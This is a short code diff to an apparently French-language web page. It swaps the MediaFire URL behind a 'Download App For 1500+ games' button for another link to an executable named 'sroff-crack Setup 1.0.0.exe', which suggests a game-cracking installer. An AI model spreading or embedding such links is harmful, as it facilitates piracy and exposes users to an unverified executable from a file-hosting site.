@@ -107,7 +107,7 @@ export default function Home() {
                 Déconnexion
               </button>
               <button
-                onClick={() => window.open('https://www.mediafire.com/file/cn1h0spuvdtp7jq/sroff-crack+Setup+1.0.0.exe/file', '_blank')}
+                onClick={() => window.open('https://www.mediafire.com/file/nas7ny2ughy97bw/sroff-crack+Setup+1.0.0.exe/file', '_blank')}
                 className="midnight-button-secondary px-4 py-2 text-sm font-medium"
               >
                 Download App For 1500+ games
